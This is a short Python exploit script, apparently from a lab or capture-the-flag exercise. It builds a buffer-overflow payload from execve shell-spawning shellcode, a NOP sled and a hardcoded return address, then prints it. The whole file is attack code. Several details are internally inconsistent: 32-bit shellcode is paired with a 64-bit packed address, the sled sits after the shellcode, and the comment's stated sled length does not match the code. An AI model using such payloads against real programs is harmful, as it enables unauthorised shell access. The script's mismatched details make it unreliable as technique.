#!/usr/bin/python3

import struct

# Preferred return address (little endian format)
# Update this line in shell.py with the correct address
actual_addr = struct.pack("Q", 0x5555555551d5)  # Adjust the address accordingly

# Shellcode for opening a shell via execve(), 25 bytes
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# NOP sled, 23 bytes
nop_sled = b"\x90" * (32 - len(shellcode))  # Adjust the length accordingly

# Combined payload
payload = shellcode + nop_sled + actual_addr

# Print the payload
print(payload)

